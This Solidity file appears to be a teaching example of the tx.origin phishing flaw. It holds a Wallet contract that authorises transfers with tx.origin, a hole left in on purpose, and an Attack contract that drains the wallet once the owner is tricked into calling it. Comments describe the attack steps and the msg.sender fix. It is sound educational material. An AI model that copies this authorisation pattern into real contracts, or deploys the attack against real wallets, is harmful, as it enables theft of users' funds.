// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


/*
1. Victim deploys Wallet with Ether
2. Attacker deploys Attack with the address of Victim's Wallet contract.
3. Attacker tricks Victim to call Attack.attack()
4. Attacker successfully stole Ether from Victim's wallet
*/

/*
With msg.sender the owner can be a contract.
With tx.origin the owner can never be a contract.

A->B->C->D  msg.sender will be C, and tx.origin will be A.
*/

/*
Victim > Wallet.transfer() (tx.origin = Victim)
Victim > Attack Contract > Wallet.transfer() (tx.origin = Victim)
 */

 /*
 Way to prevent this attack:
 Using msg.sender not tx.origin

 Here is a recommendation of Vitalik: https://ethereum.stackexchange.com/a/200

 */

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
    
    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }    
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }

}

